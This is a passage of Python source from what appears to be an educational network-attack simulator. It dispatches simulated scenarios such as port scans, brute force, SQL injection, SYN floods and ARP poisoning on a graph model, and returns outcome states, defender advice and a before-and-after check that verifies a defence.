                attacker_takeaway = f"Vulnerable entrypoint: Attacker can probe {service_name} for software exploits, weak credentials, or protocol vulnerabilities."
                defender_advice = "Audit listening service. If not needed, disable it. If required, restrict access via firewall IP allowlists."
                remediation = f"To secure this port, add a Firewall DROP rule for port {p} or disable the service in Property Inspector."
            elif state == "filtered":
                blocked_by = p_evt.detail.get("blocked_by") if p_evt and p_evt.detail else "Perimeter Firewall"
                rule_hit = p_evt.detail.get("rule") if p_evt and p_evt.detail else "Default Inbound DROP"
                who_closed = f"Perimeter Firewall / ACL ({blocked_by})"
                how_it_closed = f"Firewall intercepted TCP SYN packet and dropped it according to policy/rule: '{rule_hit}'. No packet was returned to the scanner."
                attacker_takeaway = "Firewall detected: Scanner timed out with zero response. Attacker cannot confirm if service exists behind the firewall."
                defender_advice = "Excellent security posture (Stealth mode). Defends against reconnaissance and port mapping."
                remediation = f"If this port needs to be accessible, add an ALLOW rule for source IP in {blocked_by} ACL in Property Inspector."
            else:  # closed
                who_closed = f"Target Host Kernel ({target.label} OS)"
                how_it_closed = f"Packet reached {target.label}, but no process was listening on port {p}. Linux TCP/IP stack returned TCP RST (Reset)."
                attacker_takeaway = "Host is ALIVE: The packet reached the host successfully, confirming network route is open, but this socket is inactive."
                defender_advice = "Good posture if service is unused. To prevent attackers from confirming host is alive, consider firewall filtering instead."
                remediation = f"To open this port, go to Property Inspector for {target.label} and add the {service_name} service under Services."

            port_forensics.append({
                "port": p,
                "service": service_name,
                "state": state,
                "who_closed": who_closed,
                "how_it_closed": how_it_closed,
                "attacker_takeaway": attacker_takeaway,
                "defender_advice": defender_advice,
                "remediation": remediation,
            })

        evidence = {
            "scanned_ports": ports,
            "open_ports": [pf["port"] for pf in port_forensics if pf["state"] == "open"],
            "filtered_ports": [pf["port"] for pf in port_forensics if pf["state"] == "filtered"],
            "closed_ports": [pf["port"] for pf in port_forensics if pf["state"] == "closed"],
            "port_forensics": port_forensics,
            "open_found": has_open,
            "victim_screen_state": "port_recon_exposed" if has_open else "port_recon_secure",
            "target_type": target.type,
        }

    elif sid == "auth_brute_force":
        port = int(request.parameters.get("port", 22))
        events, outcome, evidence = simulate_brute_force(graph, run_id, attacker.id, target.id, port=port)
        evidence["victim_screen_state"] = "hacked_root_terminal" if outcome == "compromised" else "ssh_login_locked"
        evidence["target_type"] = target.type

    elif sid == "traffic_analysis":
        events, outcome, evidence = simulate_traffic_analysis(graph, run_id, attacker.id, target.id)
        evidence["victim_screen_state"] = "sniffed_plaintext_credentials" if outcome == "discovered" else "encrypted_tls"
        evidence["target_type"] = target.type

    elif sid == "web_security_injection":
        atk_type = request.parameters.get("attack_type", "sqli")
        events, outcome, evidence = simulate_web_attack(graph, run_id, attacker.id, target.id, attack_type=atk_type)
        evidence["victim_screen_state"] = "defaced_sqli" if outcome == "compromised" else "waf_blocked_screen"
        evidence["target_type"] = target.type

    elif sid == "firewall_segmentation":
        events, outcome, evidence = simulate_segmentation_test(graph, run_id, attacker.id, target.id)
        evidence["victim_screen_state"] = "segmentation_breached" if outcome == "compromised" else "segmentation_isolated"
        evidence["target_type"] = target.type

    elif sid == "syn_flood_dos":
        target_port = int(request.parameters.get("port", 80))
        events, outcome, evidence = simulate_syn_flood(graph, run_id, attacker.id, target.id, target_port=target_port)
        evidence["victim_screen_state"] = "ddos_outage" if outcome == "compromised" else "ddos_mitigated_healthy"
        evidence["target_type"] = target.type
        evidence["ping_telemetry"] = (
            {"packet_loss_percent": 100, "status": "Destination Host Unreachable", "latency_ms": None}
            if outcome == "compromised"
            else {"packet_loss_percent": 0, "status": "0.38ms RTT (Healthy)", "latency_ms": 0.38}
        )
        evidence["website_http_status"] = 504 if outcome == "compromised" else 200

    elif sid == "arp_cache_poisoning":
        events, outcome, evidence = simulate_arp_poisoning(graph, run_id, attacker.id, target.id)
        evidence["victim_screen_state"] = "arp_mitm_hijacked" if outcome == "compromised" else "arp_protected"
        evidence["target_type"] = target.type

    else:
        # Generic port scan fallback
        events = simulate_port_scan(graph, run_id, attacker.id, target.id)
        outcome = "discovered"
        evidence = {"target_type": target.type, "victim_screen_state": "normal"}

    return AttackExecutionResponse(
        run_id=run_id,
        scenario_id=request.scenario_id,
        scenario_title=sc_meta["title"],
        target_id=target.id,
        target_name=target.label,
        attacker_id=attacker.id,
        status="completed",
        outcome=outcome,
        events=events,
        evidence=evidence,
        educational_takeaway=sc_meta["takeaway"],
        remediation_hint=sc_meta["remediation"],
        comparison=None,
    )


def verify_defense(
    graph: GraphData,
    request: VerifyDefenseRequest,
) -> AttackExecutionResponse:
    """
    Rerun an approved attack scenario to verify whether defensive changes blocked the attack.
    Produces a side-by-side Before/After comparison.
    """
    # Run the test against the current graph
    atk_req = AttackExecutionRequest(
        scenario_id=request.scenario_id,
        target_id=request.target_id,
        attacker_id=request.attacker_id,
        parameters=request.parameters,
        app_mode="defend",
    )
    res = execute_attack_scenario(graph, atk_req)

    # Determine effectiveness: defense is effective if outcome is 'blocked' or 'mitigated'
    defense_effective = res.outcome in ("blocked", "mitigated")
    after_status = "blocked" if defense_effective else "compromised"

    after_summary = (
        "✓ Defense Verified: Attack was successfully stopped by the applied security controls."
        if defense_effective
        else "✗ Defense Ineffective: Attack still penetrated the perimeter controls."
    )

    comparison = BeforeAfterComparison(
        scenario_id=request.scenario_id,
        target_id=request.target_id,
        target_name=res.target_name,
        defense_applied=request.applied_defense or "Firewall ACL / Hardening Rule",
        before_status="vulnerable",
        before_summary="Initial attack succeeded — target services or ports were exposed and reachable.",
        before_events_count=len(res.events),
        after_status=after_status,
        after_summary=after_summary,
        after_events_count=len(res.events),
        defense_effective=defense_effective,
        explanation=(
            f"The applied defense ('{request.applied_defense or 'Security Rule'}') was evaluated against the packet flow. "
            + ("Firewall filtering or rate-limiting successfully intercepted malicious traffic."
               if defense_effective
               else "Packets still found an open route or permissive rule to the target host.")
        ),
    )

    res.comparison = comparison
    return res

